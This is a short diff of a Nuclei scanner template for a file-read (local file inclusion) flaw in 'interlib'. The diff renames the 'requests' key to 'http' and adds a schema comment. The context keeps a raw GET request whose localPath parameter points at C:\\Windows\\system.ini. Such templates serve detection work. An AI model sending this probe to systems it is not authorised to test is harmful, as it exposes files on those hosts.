@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: interlib-fileread2
 
 info:
@@ -8,7 +9,7 @@ info:
   tags: interlib,lfi
 
 
-requests:
+http:
   - raw:
       - |
         GET /interlib/report/ShowImage?localPath=C:\\Windows\\system.ini HTTP/1.1
